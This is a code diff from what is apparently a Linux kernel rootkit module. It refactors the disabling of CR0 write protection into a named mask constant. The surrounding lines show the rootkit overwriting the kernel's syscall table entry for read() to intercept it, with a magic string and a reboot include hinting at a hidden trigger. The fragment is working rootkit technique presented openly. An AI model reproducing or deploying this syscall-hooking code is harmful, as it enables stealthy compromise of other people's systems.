@@ -29,6 +29,7 @@
 #include <linux/reboot.h>   /* Needed for kernel_restart() */
 #include "sysmap.h"   /* Needed for ROOTKIT_SYS_CALL_TABLE */
 
+#define CR0_WRITE_PROTECT_MASK (1 << 16)
 #define MAGIC "mamaliga"
 #define SIZEOF_MAGIC 8
 
@@ -84,9 +85,9 @@ static int __init interceptor_start(void)
 	   control flags that modify the basic operation of the processor. */
 	original_cr0 = read_cr0();
 
-	/* Disable `write-protect` mode. Do so by setting the WP (Write protect)
-	   bit to 0. When set to 1, the CPU can't write to read-only pages */
-	write_cr0(original_cr0 & ~0x00010000);
+    /* Disable `write-protect` mode. Do so by setting the WP (Write protect)
+       bit to 0. When set to 1, the CPU can't write to read-only pages */
+	write_cr0(original_cr0 & ~CR0_WRITE_PROTECT_MASK);
 
 	/* Store original read() syscall */
 	sys_call_table = (void *) ROOTKIT_SYS_CALL_TABLE;
@@ -114,8 +115,8 @@ static void __exit interceptor_end(void)
 	   control flags that modify the basic operation of the processor. */
 	unsigned long original_cr0 = read_cr0();
 
-	/* Disable `write-protect` mode */
-	write_cr0(original_cr0 & ~0x00010000);
+    /* Disable `write-protect` mode */
+	write_cr0(original_cr0 & ~CR0_WRITE_PROTECT_MASK);
 
 	/* Restore original read() syscall */
 	sys_call_table[__NR_read] = (unsigned long *) read_syscall_ref;
